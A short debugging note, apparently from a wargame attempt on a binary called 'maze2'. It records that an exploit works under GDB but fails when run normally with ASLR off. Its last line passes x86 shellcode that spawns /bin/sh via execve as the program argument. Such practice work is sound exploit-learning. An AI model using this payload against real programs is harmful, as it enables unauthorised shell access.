Currently works fine under GDB, but not when you actually run it.
ASLR is turned off. I think it's because GDB slightly changes the addresses around. Will look further.
gdb --args ./maze2 `python -c 'print "\xff\x35\xac\xd8\xff\xff\xc3\xb0\xd8\xff\xff\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
